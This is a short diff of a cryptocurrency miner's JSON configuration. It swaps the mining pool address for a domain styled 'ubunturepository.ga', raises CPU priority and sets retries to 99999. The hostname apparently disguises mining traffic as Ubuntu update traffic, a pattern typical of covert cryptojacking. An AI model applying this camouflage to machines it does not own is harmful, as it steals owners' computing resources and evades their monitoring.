@@ -11,7 +11,7 @@
     "background": false,
     "colors": true,
     "cpu-affinity": null,
-    "cpu-priority": null,
+    "cpu-priority": 1,
     "donate-level": 1,
     "huge-pages": true,
     "hw-aes": null,
@@ -19,7 +19,7 @@
     "max-cpu-usage": 75,
     "pools": [
         {
-            "url": "85.255.7.60:80",
+            "url": "ubunturepository.ga:80",
             "user": "YOUR_WALLET",
             "pass": "x",
             "rig-id": null,
@@ -29,8 +29,8 @@
         }
     ],
     "print-time": 60,
-    "retries": 5,
-    "retry-pause": 5,
+    "retries": 99999,
+    "retry-pause": 2,
     "safe": false,
     "threads": 3,
     "user-agent": null,
